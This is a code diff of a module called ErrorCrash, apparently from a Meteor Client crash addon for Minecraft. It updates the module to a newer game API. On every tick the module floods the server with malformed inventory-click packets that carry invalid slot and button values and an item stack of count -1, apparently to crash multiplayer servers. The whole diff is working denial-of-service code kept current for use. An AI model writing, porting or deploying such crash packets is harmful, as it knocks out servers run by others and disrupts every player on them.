@@ -14,6 +14,7 @@ import net.minecraft.item.ItemStack;
 import net.minecraft.item.Items;
 import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
 import net.minecraft.screen.slot.SlotActionType;
+import net.minecraft.screen.sync.ItemStackHash;
 import widecat.meteorcrashaddon.CrashAddon;
 
 public class ErrorCrash extends Module {
@@ -39,10 +40,10 @@ public class ErrorCrash extends Module {
 
     @EventHandler
     private void onTick(TickEvent.Post event) {
-        Int2ObjectMap<ItemStack> REAL = new Int2ObjectArrayMap<>();
-        REAL.put(0, new ItemStack(Items.RED_DYE, 1));
+        Int2ObjectMap<ItemStackHash> REAL = new Int2ObjectArrayMap<>();
+        REAL.put(0, ItemStackHash.fromItemStack(new ItemStack(Items.RED_DYE, 1), mc.player.networkHandler.getComponentHasher()));
         for (int i = 0; i < amount.get(); i++) {
-            mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId,123344, 2957234, 2859623, SlotActionType.PICKUP, new ItemStack(Items.AIR, -1), REAL));
+            mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(mc.player.currentScreenHandler.syncId, 123344, (short) 2957234, (byte) 2859623, SlotActionType.PICKUP, REAL, ItemStackHash.fromItemStack(new ItemStack(Items.AIR, -1), mc.player.networkHandler.getComponentHasher())));
         }
     }
 
